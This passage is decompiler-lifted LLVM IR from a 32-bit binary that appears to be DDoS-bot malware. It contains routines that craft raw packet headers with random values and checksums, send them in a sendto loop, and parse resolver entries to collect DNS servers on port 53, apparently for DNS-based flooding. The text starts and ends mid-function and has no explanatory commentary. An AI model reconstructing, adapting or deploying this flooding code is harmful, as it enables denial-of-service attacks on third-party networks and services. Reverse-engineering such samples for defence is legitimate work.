  %v4_8049a6e = sdiv i32 %sext6, 65536
  %v0_8049a74 = load i32, i32* @ebp, align 4
  %v2_8049a74 = add nsw i32 %v4_8049a6e, -8208
  %v3_8049a74 = add i32 %v2_8049a74, %v0_8049a74
  %v4_8049a74 = inttoptr i32 %v3_8049a74 to i8*
  store i8 0, i8* %v4_8049a74, align 1
  %v0_8049a83 = load i32, i32* @ebp, align 4
  %v2_8049a83 = add nsw i32 %v4_8049a6e, -8207
  %v3_8049a83 = add i32 %v2_8049a83, %v0_8049a83
  %v4_8049a83 = inttoptr i32 %v3_8049a83 to i8*
  store i8 0, i8* %v4_8049a83, align 1
  %v0_8049a94 = load i32, i32* @ebp, align 4
  %v2_8049a94 = add nsw i32 %v4_8049a6e, -8206
  %v3_8049a94 = add i32 %v2_8049a94, %v0_8049a94
  %v4_8049a94 = inttoptr i32 %v3_8049a94 to i8*
  store i8 41, i8* %v4_8049a94, align 1
  %v0_8049aa5 = load i32, i32* @ebp, align 4
  %v2_8049aa5 = add nsw i32 %v4_8049a6e, -8205
  %v3_8049aa5 = add i32 %v2_8049aa5, %v0_8049aa5
  %v4_8049aa5 = inttoptr i32 %v3_8049aa5 to i8*
  store i8 35, i8* %v4_8049aa5, align 1
  %v0_8049ab6 = load i32, i32* @ebp, align 4
  %v2_8049ab6 = add nsw i32 %v4_8049a6e, -8204
  %v3_8049ab6 = add i32 %v2_8049ab6, %v0_8049ab6
  %v4_8049ab6 = inttoptr i32 %v3_8049ab6 to i8*
  store i8 40, i8* %v4_8049ab6, align 1
  %v0_8049ac7 = load i32, i32* @ebp, align 4
  %v2_8049ac7 = add nsw i32 %v4_8049a6e, -8203
  %v3_8049ac7 = add i32 %v2_8049ac7, %v0_8049ac7
  %v4_8049ac7 = inttoptr i32 %v3_8049ac7 to i8*
  store i8 0, i8* %v4_8049ac7, align 1
  %v0_8049ad8 = load i32, i32* @ebp, align 4
  %v2_8049ad8 = add nsw i32 %v4_8049a6e, -8202
  %v3_8049ad8 = add i32 %v2_8049ad8, %v0_8049ad8
  %v4_8049ad8 = inttoptr i32 %v3_8049ad8 to i8*
  store i8 0, i8* %v4_8049ad8, align 1
  %v0_8049ae9 = load i32, i32* @ebp, align 4
  %v2_8049ae9 = add nsw i32 %v4_8049a6e, -8201
  %v3_8049ae9 = add i32 %v2_8049ae9, %v0_8049ae9
  %v4_8049ae9 = inttoptr i32 %v3_8049ae9 to i8*
  store i8 0, i8* %v4_8049ae9, align 1
  %v0_8049afa = load i32, i32* @ebp, align 4
  %v2_8049afa = add nsw i32 %v4_8049a6e, -8200
  %v3_8049afa = add i32 %v2_8049afa, %v0_8049afa
  %v4_8049afa = inttoptr i32 %v3_8049afa to i8*
  store i8 0, i8* %v4_8049afa, align 1
  %v0_8049b0b = load i32, i32* @ebp, align 4
  %v2_8049b0b = add nsw i32 %v4_8049a6e, -8199
  %v3_8049b0b = add i32 %v2_8049b0b, %v0_8049b0b
  %v4_8049b0b = inttoptr i32 %v3_8049b0b to i8*
  store i8 0, i8* %v4_8049b0b, align 1
  %v0_8049b1c = load i32, i32* @ebp, align 4
  %v2_8049b1c = add nsw i32 %v4_8049a6e, -8198
  %v3_8049b1c = add i32 %v2_8049b1c, %v0_8049b1c
  %v4_8049b1c = inttoptr i32 %v3_8049b1c to i8*
  store i8 0, i8* %v4_8049b1c, align 1
  %v0_8049b2d = load i32, i32* @ebp, align 4
  %v2_8049b2d = add nsw i32 %v4_8049a6e, -8197
  %v3_8049b2d = add i32 %v2_8049b2d, %v0_8049b2d
  %v4_8049b2d = inttoptr i32 %v3_8049b2d to i8*
  store i8 0, i8* %v4_8049b2d, align 1
  %v5_8049b35 = add nsw i32 %v4_8049a6e, 11
  store i32 %v3_804998b, i32* %eax.global-to-local, align 4
  %v1_8049b3c = add i32 %v3_804998b, 4
  %v2_8049b3c = inttoptr i32 %v1_8049b3c to i32*
  %v3_8049b3c = load i32, i32* %v2_8049b3c, align 4
  store i32 %v3_8049b3c, i32* %v3_8049935, align 4
  store i32 40, i32* %edx.global-to-local, align 4
  %sext30 = mul i32 %v5_8049b35, 65536
  %v4_8049b4a = sdiv i32 %sext30, 65536
  %v2_8049b4d = add nsw i32 %v4_8049b4a, 40
  %v1_8049b50 = add nsw i32 %v4_8049b4a, 20
  %v1_8049b53 = urem i32 %v1_8049b50, 65536
  store i32 %v1_8049b53, i32* %eax.global-to-local, align 4
  %v0_8049b58 = load i32, i32* @esp, align 4
  %v2_8049b5b = add i32 %v0_8049b58, -16
  %v3_8049b5b = inttoptr i32 %v2_8049b5b to i32*
  store i32 %v1_8049b53, i32* %v3_8049b5b, align 4
  %v2_8049b5c = call i32 @htons(i32 %v4_8049b4a)
  %v3_8049b5c = trunc i32 %v2_8049b5c to i16
  store i16 %v3_8049b5c, i16* %v4_8049b69, align 4
  store i32 %v2_8049b4d, i32* %edx.global-to-local, align 4
  store i32 %v2_8049729, i32* %eax.global-to-local, align 4
  %v1_8049b7a = trunc i32 %v2_8049b4d to i16
  store i16 %v1_8049b7a, i16* %v2_8049772, align 2
  %v2_8049b7e = call i32 @rand_cmwc(i32 %v4_8049b4a)
  %v1_8049b83 = urem i32 %v2_8049b7e, 65536
  store i32 %v1_8049b83, i32* %eax.global-to-local, align 4
  %v0_8049b88 = load i32, i32* @esp, align 4
  %v2_8049b8b = add i32 %v0_8049b88, -16
  %v3_8049b8b = inttoptr i32 %v2_8049b8b to i32*
  store i32 %v1_8049b83, i32* %v3_8049b8b, align 4
  %v2_8049b8c = call i32 @htons(i32 %v4_8049b4a)
  %v3_8049b8c = trunc i32 %v2_8049b8c to i16
  %sext36 = mul i32 %v2_8049b8c, 65536
  %v1_8049b94 = sdiv i32 %sext36, 65536
  store i32 %v1_8049b94, i32* %edx.global-to-local, align 4
  store i16 %v3_8049b8c, i16* %v5_80497df, align 4
  store i32 %v2_8049729, i32* %eax.global-to-local, align 4
  %v3_8049b9f = load i16, i16* %v2_8049772, align 2
  %v3_8049ba3 = udiv i16 %v3_8049b9f, 2
  %v9_8049ba3 = zext i16 %v3_8049ba3 to i32
  store i32 %v9_8049ba3, i32* %eax.global-to-local, align 4
  store i32 %v2_8049729, i32* %edx.global-to-local, align 4
  %v1_8049bb1 = load i32, i32* @esp, align 4
  %v2_8049bb1 = add i32 %v1_8049bb1, -4
  %v3_8049bb1 = inttoptr i32 %v2_8049bb1 to i32*
  store i32 %v9_8049ba3, i32* %v3_8049bb1, align 4
  %v2_8049bb2 = add i32 %v1_8049bb1, -8
  %v3_8049bb2 = inttoptr i32 %v2_8049bb2 to i32*
  store i32 %v2_8049729, i32* %v3_8049bb2, align 4
  %v3_8049bb3 = inttoptr i32 %v4_8049b4a to i16*
  %v4_8049bb3 = call i32 @csum(i16* %v3_8049bb3, i32 %v2_80499ca)
  %v5_8049bb3 = trunc i32 %v4_8049bb3 to i16
  %sext38 = mul i32 %v4_8049bb3, 65536
  %v1_8049bbb = sdiv i32 %sext38, 65536
  store i32 %v1_8049bbb, i32* %edx.global-to-local, align 4
  store i32 %v2_8049729, i32* %eax.global-to-local, align 4
  store i16 %v5_8049bb3, i16* %v2_80497ab, align 2
  %v0_8049bde.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049bcd

dec_label_pc_8049bcd:                             ; preds = %dec_label_pc_8049988, %dec_label_pc_8049bcd
  %v0_8049bde = phi i32 [ %v0_8049bde.pre, %dec_label_pc_8049988 ], [ %v1_8049bf6, %dec_label_pc_8049bcd ]
  %storemerge72 = phi i32 [ 0, %dec_label_pc_8049988 ], [ %v4_8049bf9, %dec_label_pc_8049bcd ]
  store i32 %v3_804998b, i32* %edx.global-to-local, align 4
  store i32 %v2_8049729, i32* %eax.global-to-local, align 4
  %v3_8049bd5 = load i16, i16* %v2_8049772, align 2
  %v4_8049bd5 = zext i16 %v3_8049bd5 to i32
  store i32 %v4_8049bd5, i32* %eax.global-to-local, align 4
  %v1_8049be1 = add i32 %v0_8049bde, -12
  %v2_8049be1 = inttoptr i32 %v1_8049be1 to i32*
  store i32 16, i32* %v2_8049be1, align 4
  %v0_8049be3 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049be3 = add i32 %v0_8049bde, -16
  %v3_8049be3 = inttoptr i32 %v2_8049be3 to i32*
  store i32 %v0_8049be3, i32* %v3_8049be3, align 4
  %v1_8049be4 = add i32 %v0_8049bde, -20
  %v2_8049be4 = inttoptr i32 %v1_8049be4 to i32*
  store i32 0, i32* %v2_8049be4, align 4
  %v0_8049be6 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049be6 = add i32 %v0_8049bde, -24
  %v3_8049be6 = inttoptr i32 %v2_8049be6 to i32*
  store i32 %v0_8049be6, i32* %v3_8049be6, align 4
  store i32 %v2_8049729, i32* %eax.global-to-local, align 4
  %v2_8049bed = add i32 %v0_8049bde, -28
  %v3_8049bed = inttoptr i32 %v2_8049bed to i32*
  store i32 %v2_8049729, i32* %v3_8049bed, align 4
  %v5_8049bee = add i32 %v0_8049bde, -32
  %v6_8049bee = inttoptr i32 %v5_8049bee to i32*
  store i32 %v5_80496e1, i32* %v6_8049bee, align 4
  %v8_8049bf1 = call i32 @sendto(i32 %storemerge72, i32 %stack_var_-24.1, i32 %v4_8049b4a, i32 %v2_80499ca, i32 %v2_8049a32, i32 %v0_804966b)
  store i32 %v8_8049bf1, i32* %eax.global-to-local, align 4
  %v0_8049bf6 = load i32, i32* @esp, align 4
  %v1_8049bf6 = add i32 %v0_8049bf6, 32
  %v4_8049bf9 = add nuw nsw i32 %storemerge72, 1
  %exitcond = icmp eq i32 %v4_8049bf9, 25
  br i1 %exitcond, label %dec_label_pc_8049c02, label %dec_label_pc_8049bcd

dec_label_pc_8049c02:                             ; preds = %dec_label_pc_8049bcd
  %v23_8049b35 = trunc i32 %v5_8049b35 to i16
  %v4_8049c02 = add i32 %stack_var_-24.1, 1
  br label %dec_label_pc_804996e

; uselistorder directives
  uselistorder i32 %storemerge72, { 1, 0 }
  uselistorder i32 %v0_8049bde, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v9_8049ba3, { 1, 0 }
  uselistorder i32 %v1_8049b83, { 1, 0 }
  uselistorder i32 %v1_8049b53, { 1, 0 }
  uselistorder i32 %v2_8049b4d, { 1, 0 }
  uselistorder i32 %v4_8049b4a, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v5_8049b35, { 1, 0 }
  uselistorder i32 %v4_8049a6e, { 0, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %v4_8049a24, { 1, 0 }
  uselistorder i32 %v3_804998b, { 0, 3, 2, 4, 1 }
  uselistorder i32 %stack_var_-24.1, { 1, 0 }
  uselistorder i32 %stack_var_-52.0, { 1, 0 }
  uselistorder i32 %stack_var_-24.0, { 1, 0 }
  uselistorder i16 %stack_var_-20.0, { 1, 0 }
  uselistorder i32 %v2_80499ca, { 0, 1, 4, 5, 6, 3, 2 }
  uselistorder i8* %v2_8049893, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i32 %v1_804988a, { 1, 0 }
  uselistorder i8* %v2_8049857, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i32 %v1_804983b, { 1, 0 }
  uselistorder i32 %v1_80497e5, { 1, 0 }
  uselistorder i32 %v2_8049729, { 32, 33, 2, 3, 34, 35, 4, 5, 0, 1, 20, 21, 6, 36, 7, 8, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 9, 10, 11, 12, 13, 14, 15, 17, 16, 18, 19, 37 }
  uselistorder i32 %v3_80496c6, { 0, 2, 1 }
  uselistorder i32 %v3_80496a8, { 1, 0 }
  uselistorder i32 %tmp59, { 6, 5, 4, 3, 2, 1, 0, 7 }
  uselistorder label %dec_label_pc_8049bcd, { 1, 0 }
  uselistorder label %dec_label_pc_8049988, { 1, 0 }
  uselistorder label %dec_label_pc_8049713, { 1, 0 }
}

define i32 @ParseResolverLine(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-768 = alloca i32, align 4
  %stack_var_-568 = alloca i32, align 4
  %stack_var_-256 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-1079 = alloca i32, align 4
  %stack_var_-567 = alloca i32, align 4
  %stack_var_-55 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8049c0d = load i32, i32* @edi, align 4
  %v0_8049c0e = load i32, i32* @ebx, align 4
  store i32 %v0_8049c0e, i32* %stack_var_-12, align 4
  %v2_8049c15 = load i32, i32* @eax, align 4
  %v3_8049c15 = and i32 %v2_8049c15, -256
  store i32 %v3_8049c15, i32* %stack_var_-56, align 4
  %v2_8049c1d = ptrtoint i32* %stack_var_-55 to i32
  %tmp25 = bitcast i32* %stack_var_-55 to i8*
  store i32 %v2_8049c1d, i32* @edi, align 4
  store i32 %v3_8049c15, i32* %eax.global-to-local, align 4
  %v5_8049c28 = call i8* @_memset(i8* %tmp25, i32 %v3_8049c15, i32 31)
  store i32 %v3_8049c15, i32* %stack_var_-568, align 4
  %v2_8049c35 = ptrtoint i32* %stack_var_-567 to i32
  store i32 %v2_8049c35, i32* %edx.global-to-local, align 4
  store i32 511, i32* %eax.global-to-local, align 4
  %v3_8049c47 = bitcast i32* %stack_var_-567 to i8*
  %v4_8049c47 = call i32 @__GI_memset(i8* %v3_8049c47, i32 0, i32 511)
  %v2_8049c5a = ptrtoint i32* %stack_var_-1079 to i32
  store i32 %v2_8049c5a, i32* %edx.global-to-local, align 4
  store i32 511, i32* %eax.global-to-local, align 4
  %v3_8049c6c = bitcast i32* %stack_var_-1079 to i8*
  %v4_8049c6c = call i32 @__GI_memset(i8* %v3_8049c6c, i32 0, i32 511)
  store i32 %v4_8049c6c, i32* %eax.global-to-local, align 4
  %v4_8049d22 = ptrtoint i8* %arg1 to i32
  %v1_8049d30 = and i32 %v4_8049d22, -256
  %v2_8049cea = ptrtoint i32* %stack_var_-568 to i32
  %v2_8049cfb = ptrtoint i32* %stack_var_-768 to i32
  %v4_8049cfe = bitcast i32* %stack_var_-568 to i8*
  %v2_8049cb6 = ptrtoint i32* %stack_var_-56 to i32
  %v2_8049cc4 = ptrtoint i32* %stack_var_-256 to i32
  %v4_8049cc7 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_8049d1f

dec_label_pc_8049c87:                             ; preds = %dec_label_pc_8049d1f
  %v6_8049c8a = add i32 %storemerge, %v4_8049d22
  store i32 %v6_8049c8a, i32* %eax.global-to-local, align 4
  %v1_8049c8d = inttoptr i32 %v6_8049c8a to i8*
  %v2_8049c8d = load i8, i8* %v1_8049c8d, align 1
  %v3_8049c8d = zext i8 %v2_8049c8d to i32
  %v5_8049c8d = and i32 %v6_8049c8a, -256
  %v6_8049c8d = or i32 %v3_8049c8d, %v5_8049c8d
  store i32 %v6_8049c8d, i32* %eax.global-to-local, align 4
  %v7_8049c8f = icmp eq i8 %v2_8049c8d, 32
  br i1 %v7_8049c8f, label %dec_label_pc_8049cab, label %dec_label_pc_8049c93

dec_label_pc_8049c93:                             ; preds = %dec_label_pc_8049c87
  store i32 %v6_8049c8a, i32* %eax.global-to-local, align 4
  %v2_8049c99 = load i8, i8* %v1_8049c8d, align 1
  %v3_8049c99 = zext i8 %v2_8049c99 to i32
  %v6_8049c99 = or i32 %v3_8049c99, %v5_8049c8d
  store i32 %v6_8049c99, i32* %eax.global-to-local, align 4
  %v10_8049c9b = icmp eq i8 %v2_8049c99, 10
  br i1 %v10_8049c9b, label %dec_label_pc_8049cab, label %dec_label_pc_8049c9f

dec_label_pc_8049c9f:                             ; preds = %dec_label_pc_8049c93
  store i32 %v6_8049c8a, i32* %eax.global-to-local, align 4
  %v2_8049ca5 = load i8, i8* %v1_8049c8d, align 1
  %v3_8049ca5 = zext i8 %v2_8049ca5 to i32
  %v6_8049ca5 = or i32 %v3_8049ca5, %v5_8049c8d
  store i32 %v6_8049ca5, i32* %eax.global-to-local, align 4
  %v10_8049ca7 = icmp eq i8 %v2_8049ca5, 9
  %v1_8049ca9 = icmp eq i1 %v10_8049ca7, false
  br i1 %v1_8049ca9, label %dec_label_pc_8049cb0, label %dec_label_pc_8049cab

dec_label_pc_8049cab:                             ; preds = %dec_label_pc_8049c9f, %dec_label_pc_8049c93, %dec_label_pc_8049c87
  %v4_8049cab = add i32 %stack_var_-20.1, 1
  br label %dec_label_pc_8049d1c

dec_label_pc_8049cb0:                             ; preds = %dec_label_pc_8049c9f
  %v4_8049cb0 = icmp eq i32 %stack_var_-20.1, 0
  %v1_8049cb4 = icmp eq i1 %v4_8049cb0, false
  br i1 %v1_8049cb4, label %dec_label_pc_8049ce4, label %dec_label_pc_8049cb6

dec_label_pc_8049cb6:                             ; preds = %dec_label_pc_8049cb0
  store i32 %v2_8049cc4, i32* %eax.global-to-local, align 4
  %v3_8049ccd = call i32 @_strlen(i8* %v4_8049cc7)
  %v4_8049ccd = mul i32 %v3_8049ccd, -1
  %v1_8049cd3 = sub i32 0, %v4_8049ccd
  store i32 %v1_8049cd3, i32* %edx.global-to-local, align 4
  store i32 %v6_8049c8a, i32* %eax.global-to-local, align 4
  %v2_8049cdc = load i8, i8* %v1_8049c8d, align 1
  %v3_8049cdc = zext i8 %v2_8049cdc to i32
  %v6_8049cdc = or i32 %v3_8049cdc, %v5_8049c8d
  store i32 %v6_8049cdc, i32* %eax.global-to-local, align 4
  %v2_8049cde = load i32, i32* @ebp, align 4
  %v4_8049cde = sub i32 -52, %v4_8049ccd
  %v5_8049cde = add i32 %v4_8049cde, %v2_8049cde
  %v6_8049cde = inttoptr i32 %v5_8049cde to i8*
  store i8 %v2_8049cdc, i8* %v6_8049cde, align 1
  br label %dec_label_pc_8049d1c

dec_label_pc_8049ce4:                             ; preds = %dec_label_pc_8049cb0
  %v12_8049ce4 = icmp eq i32 %stack_var_-20.1, 1
  %v1_8049ce8 = icmp eq i1 %v12_8049ce4, false
  br i1 %v1_8049ce8, label %dec_label_pc_8049d1c, label %dec_label_pc_8049cea

dec_label_pc_8049cea:                             ; preds = %dec_label_pc_8049ce4
  store i32 %v2_8049cfb, i32* %eax.global-to-local, align 4
  %v3_8049d04 = call i32 @_strlen(i8* %v4_8049cfe)
  %v4_8049d04 = mul i32 %v3_8049d04, -1
  %v1_8049d0a = sub i32 0, %v4_8049d04
  store i32 %v1_8049d0a, i32* %edx.global-to-local, align 4
  store i32 %v6_8049c8a, i32* %eax.global-to-local, align 4
  %v2_8049d13 = load i8, i8* %v1_8049c8d, align 1
  %v3_8049d13 = zext i8 %v2_8049d13 to i32
  %v6_8049d13 = or i32 %v3_8049d13, %v5_8049c8d
  store i32 %v6_8049d13, i32* %eax.global-to-local, align 4
  %v2_8049d15 = load i32, i32* @ebp, align 4
  %v4_8049d15 = sub i32 -564, %v4_8049d04
  %v5_8049d15 = add i32 %v4_8049d15, %v2_8049d15
  %v6_8049d15 = inttoptr i32 %v5_8049d15 to i8*
  store i8 %v2_8049d13, i8* %v6_8049d15, align 1
  br label %dec_label_pc_8049d1c

dec_label_pc_8049d1c:                             ; preds = %dec_label_pc_8049ce4, %dec_label_pc_8049cb6, %dec_label_pc_8049cab, %dec_label_pc_8049cea
  %stack_var_-20.0 = phi i32 [ %v4_8049cab, %dec_label_pc_8049cab ], [ %stack_var_-20.1, %dec_label_pc_8049ce4 ], [ %stack_var_-20.1, %dec_label_pc_8049cea ], [ %stack_var_-20.1, %dec_label_pc_8049cb6 ]
  %v4_8049d1c = add i32 %storemerge, 1
  br label %dec_label_pc_8049d1f

dec_label_pc_8049d1f:                             ; preds = %entry, %dec_label_pc_8049d1c
  %stack_var_-20.1 = phi i32 [ 0, %entry ], [ %stack_var_-20.0, %dec_label_pc_8049d1c ]
  %storemerge = phi i32 [ 0, %entry ], [ %v4_8049d1c, %dec_label_pc_8049d1c ]
  store i32 %storemerge, i32* %edx.global-to-local, align 4
  store i32 %v1_8049d30, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_8049d22, i32* @edi, align 4
  %v3_8049d39 = call i32 @_strlen(i8* %arg1)
  %v4_8049d39 = mul i32 %v3_8049d39, -1
  %v5_8049d39 = add i32 %v4_8049d39, -2
  store i32 %v5_8049d39, i32* @ecx, align 4
  %v1_8049d3f = sub i32 0, %v4_8049d39
  store i32 %v1_8049d3f, i32* %eax.global-to-local, align 4
  %v0_8049d40 = load i32, i32* %edx.global-to-local, align 4
  %v7_8049d40 = icmp ult i32 %v0_8049d40, %v1_8049d3f
  br i1 %v7_8049d40, label %dec_label_pc_8049c87, label %dec_label_pc_8049d48

dec_label_pc_8049d48:                             ; preds = %dec_label_pc_8049d1f
  %v0_8049d48 = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_8049d48, i32* %eax.global-to-local, align 4
  %v1_8049d4d = icmp eq i32 %v0_8049d48, 0
  %v1_8049d4f = icmp eq i1 %v1_8049d4d, false
  %v1_8049e12 = call i32 @malloc(i32 540)
  store i32 %v1_8049e12, i32* %eax.global-to-local, align 4
  br i1 %v1_8049d4f, label %dec_label_pc_8049e0a, label %dec_label_pc_8049d55

dec_label_pc_8049d55:                             ; preds = %dec_label_pc_8049d48
  store i32 %v1_8049e12, i32* @global_var_807dca0.85, align 32
  store i32 %v1_8049e12, i32* %eax.global-to-local, align 4
  %v1_8049d6f = inttoptr i32 %v1_8049e12 to i32*
  store i32 0, i32* %v1_8049d6f, align 4
  %v0_8049d75 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049d75 = add i32 %v0_8049d75, 4
  %v2_8049d75 = inttoptr i32 %v1_8049d75 to i32*
  store i32 0, i32* %v2_8049d75, align 4
  %v0_8049d7c = load i32, i32* %eax.global-to-local, align 4
  %v1_8049d7c = add i32 %v0_8049d7c, 8
  %v2_8049d7c = inttoptr i32 %v1_8049d7c to i32*
  store i32 0, i32* %v2_8049d7c, align 4
  %v0_8049d83 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049d83 = add i32 %v0_8049d83, 12
  %v2_8049d83 = inttoptr i32 %v1_8049d83 to i32*
  store i32 0, i32* %v2_8049d83, align 4
  %v0_8049d8a = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_8049d8a, i32* @ebx, align 4
  store i32 %v2_8049cb6, i32* %eax.global-to-local, align 4
  %v1_8049d97 = call i32 @inet_addr(i32 %v2_8049cb6)
  store i32 %v1_8049d97, i32* %eax.global-to-local, align 4
  %v1_8049d9f = load i32, i32* @ebx, align 4
  %v2_8049d9f = add i32 %v1_8049d9f, 4
  %v3_8049d9f = inttoptr i32 %v2_8049d9f to i32*
  store i32 %v1_8049d97, i32* %v3_8049d9f, align 4
  %v0_8049da2 = load i32, i32* @global_var_807dca0.85, align 32
  %v1_8049dad = call i32 @htons(i32 53)
  %v2_8049dad = trunc i32 %v1_8049dad to i16
  %v4_8049db5 = add i32 %v0_8049da2, 2
  %v5_8049db5 = inttoptr i32 %v4_8049db5 to i16*
  store i16 %v2_8049dad, i16* %v5_8049db5, align 2
  %v0_8049db9 = load i32, i32* @global_var_807dca0.85, align 32
  %v1_8049dbe = add i32 %v0_8049db9, 16
  store i32 %v1_8049dbe, i32* %edx.global-to-local, align 4
  store i32 %v2_8049cea, i32* @eax, align 4
  %v2_8049dcc = inttoptr i32 %v1_8049dbe to i8*
  %v3_8049dcc = call i32 @strcpy(i8* %v2_8049dcc, i32 %v2_8049cea)
  %v0_8049dd4 = load i32, i32* @global_var_807dca0.85, align 32
  %v2_8049ddd = add i32 %v0_8049dd4, 528
  %v3_8049ddd = inttoptr i32 %v2_8049ddd to i32*
  store i32 %arg2, i32* %v3_8049ddd, align 4
  %v0_8049de3 = load i32, i32* @global_var_807dca0.85, align 32
  %v2_8049dee = add i32 %v0_8049de3, 532
  %v3_8049dee = inttoptr i32 %v2_8049dee to i32*
  store i32 %v0_8049de3, i32* %v3_8049dee, align 4
  %v0_8049df4 = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_8049df4, i32* @edx, align 4
  store i32 %v0_8049df4, i32* %eax.global-to-local, align 4
  %v2_8049dff = add i32 %v0_8049df4, 536
  %v3_8049dff = inttoptr i32 %v2_8049dff to i32*
  store i32 %v0_8049df4, i32* %v3_8049dff, align 4
  br label %dec_label_pc_8049ebd

dec_label_pc_8049e0a:                             ; preds = %dec_label_pc_8049d48
  store i32 %v1_8049e12, i32* @edx, align 4
  store i32 540, i32* %eax.global-to-local, align 4
  %v3_8049e2e = inttoptr i32 %v1_8049e12 to i8*
  %v4_8049e2e = call i32 @__GI_memset(i8* %v3_8049e2e, i32 0, i32 540)
  store i32 %v2_8049cb6, i32* %eax.global-to-local, align 4
  %v1_8049e3d = call i32 @inet_addr(i32 %v2_8049cb6)
  store i32 %v1_8049e3d, i32* %edx.global-to-local, align 4
  store i32 %v1_8049e12, i32* %eax.global-to-local, align 4
  %v2_8049e4a = add i32 %v1_8049e12, 4
  %v3_8049e4a = inttoptr i32 %v2_8049e4a to i32*
  store i32 %v1_8049e3d, i32* %v3_8049e4a, align 4
  %v1_8049e52 = call i32 @htons(i32 53)
  %v2_8049e52 = trunc i32 %v1_8049e52 to i16
  %v3_8049e5f = add i32 %v1_8049e12, 2
  %v4_8049e5f = inttoptr i32 %v3_8049e5f to i16*
  store i16 %v2_8049e52, i16* %v4_8049e5f, align 2
  %v1_8049e66 = add i32 %v1_8049e12, 16
  store i32 %v1_8049e66, i32* %edx.global-to-local, align 4
  store i32 %v2_8049cea, i32* @eax, align 4
  %v2_8049e74 = inttoptr i32 %v1_8049e66 to i8*
  %v3_8049e74 = call i32 @strcpy(i8* %v2_8049e74, i32 %v2_8049cea)
  %v0_8049e7c = load i32, i32* @global_var_807dca0.85, align 32
  %v2_8049e85 = add i32 %v1_8049e12, 536
  %v3_8049e85 = inttoptr i32 %v2_8049e85 to i32*
  store i32 %v0_8049e7c, i32* %v3_8049e85, align 4
  %v0_8049e8b = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_8049e8b, i32* %edx.global-to-local, align 4
  %v2_8049e94 = add i32 %v0_8049e8b, 528
  %v3_8049e94 = inttoptr i32 %v2_8049e94 to i32*
  store i32 %arg2, i32* %v3_8049e94, align 4
  %v0_8049e9a = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_8049e9a, i32* %eax.global-to-local, align 4
  %v1_8049e9f = add i32 %v0_8049e9a, 532
  %v2_8049e9f = inttoptr i32 %v1_8049e9f to i32*
  %v3_8049e9f = load i32, i32* %v2_8049e9f, align 4
  %v2_8049ea8 = add i32 %v1_8049e12, 532
  %v3_8049ea8 = inttoptr i32 %v2_8049ea8 to i32*
  store i32 %v3_8049e9f, i32* %v3_8049ea8, align 4
  %v0_8049eae = load i32, i32* @global_var_807dca0.85, align 32
  store i32 %v0_8049eae, i32* @edx, align 4
  store i32 %v1_8049e12, i32* %eax.global-to-local, align 4
  %v2_8049eb7 = add i32 %v0_8049eae, 532
  %v3_8049eb7 = inttoptr i32 %v2_8049eb7 to i32*
  store i32 %v1_8049e12, i32* %v3_8049eb7, align 4
  br label %dec_label_pc_8049ebd

dec_label_pc_8049ebd:                             ; preds = %dec_label_pc_8049d55, %dec_label_pc_8049e0a
  %v2_8049ec0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8049ec0, i32* @ebx, align 4
  store i32 %v0_8049c0d, i32* @edi, align 4
  %v0_8049ec3 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8049ec3

; uselistorder directives
  uselistorder i32 %v1_8049e3d, { 1, 0 }
  uselistorder i32 %v0_8049df4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_8049de3, { 1, 0 }
  uselistorder i32 %v1_8049e12, { 2, 1, 3, 4, 5, 6, 8, 7, 0, 12, 11, 10, 9, 13 }
  uselistorder i32 %v1_8049d3f, { 1, 0 }
  uselistorder i32 %storemerge, { 2, 0, 1 }
  uselistorder i32 %stack_var_-20.1, { 5, 4, 0, 3, 2, 1 }
  uselistorder i8* %v1_8049c8d, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v6_8049c8a, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v2_8049cb6, { 1, 0, 3, 2 }
  uselistorder i32 %v2_8049cea, { 1, 0, 3, 2 }
  uselistorder i32 %v4_8049d22, { 1, 0, 2 }
  uselistorder i32 %v3_8049c15, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-56, { 0, 2, 1 }
  uselistorder i32* %stack_var_-568, { 0, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 6, 7, 4, 5, 8, 9 }
  uselistorder i32* %eax.global-to-local, { 6, 0, 1, 2, 3, 4, 7, 8, 9, 10, 11, 12, 13, 5, 14, 27, 28, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 30, 31, 32 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049ebd, { 1, 0 }
  uselistorder label %dec_label_pc_8049d1f, { 1, 0 }
  uselistorder label %dec_label_pc_8049d1c, { 3, 0, 1, 2 }
}

define i32 @dns(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-855 = alloca i32, align 4
  %stack_var_-599 = alloca i32, align 4
  %stack_var_-568 = alloca i32, align 4
